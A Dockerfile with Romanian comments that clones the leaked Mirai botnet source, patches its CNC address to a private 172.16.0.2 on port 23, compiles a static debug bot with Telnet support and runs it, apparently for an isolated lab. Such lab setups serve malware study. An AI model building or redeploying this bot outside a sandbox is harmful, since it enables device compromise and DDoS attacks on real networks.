# Folosim imaginea de bază Ubuntu (cea mai recentă versiune).
FROM ubuntu:latest

# Actualizăm lista de pachete și instalăm git și build-essential (care include compilatoare și alte unelte necesare pentru compilarea codului).
RUN apt update && apt install -y git build-essential 

# Setăm directorul de lucru al containerului la /app. Toate comenzile ulterioare vor fi executate din acest director.
WORKDIR /app

# Clonăm repository-ul de pe GitHub care conține codul sursă al botului Mirai. Aici trebuie să punem codul pe care vrem să-l compilăm.
RUN git clone https://github.com/jgamblin/Mirai-Source-Code.git

# Intrăm în directorul unde s-a clonat codul sursă al Mirai.
WORKDIR /app/Mirai-Source-Code/mirai

# Verificăm conținutul directorului, ca să ne asigurăm că fișierele sunt acolo.
RUN ls -l

# Modificăm fișierul 'includes.h' pentru a face variabila LOCAL_ADDR externă, ceea ce înseamnă că o vom declara în altă parte (în alt fișier).
# Asta ajută la rezolvarea unor conflicte de definire a variabilelor.
RUN sed -i 's/ipv4_t LOCAL_ADDR;/extern &/' bot/includes.h
# Înlocuim în 'main.c' definiția structurii 'srv_addr' cu o variantă care include LOCAL_ADDR, astfel încât să fie compatibil cu modificarea de mai sus.
RUN sed -i 's/struct sockaddr_in srv_addr;/ipv4_t LOCAL_ADDR;\n&/' bot/main.c

# Modificăm fișierul 'includes.h' pentru a pune adresa IP corectă a CNC-ului și portul 23, conform configurării din Docker.
# Este important să modificăm aceste setări ca să funcționeze conexiunea botului.
RUN sed -i 's/#define FAKE_CNC_ADDR   INET_ADDR(65,222,202,53)/#define FAKE_CNC_ADDR   INET_ADDR(172,16,0,2)/' bot/includes.h
RUN sed -i 's/#define FAKE_CNC_PORT   80/#define FAKE_CNC_PORT   23/' bot/includes.h

# Compilăm tot codul sursă al botului folosind GCC. Setăm standardul C99, definim opțiuni de debug și activăm suportul pentru Telnet.
# 'static' înseamnă că se va crea un binar complet legat (fără dependențe externe) și se activează opțiuni de depanare.
RUN gcc -std=c99 bot/*.c -DDEBUG -DMIRAI_TELNET -static -g -o /app/mirai.dbg

# Setăm entrypoint-ul containerului. Înainte de a porni botul, facem o pauză de 15 secunde pentru a ne asigura că cnc-ul e gata.
# După acea pauză, se va lansa binarul compilat 'mirai.dbg'.
ENTRYPOINT sleep 15 && echo "Starting" && /app/mirai.dbg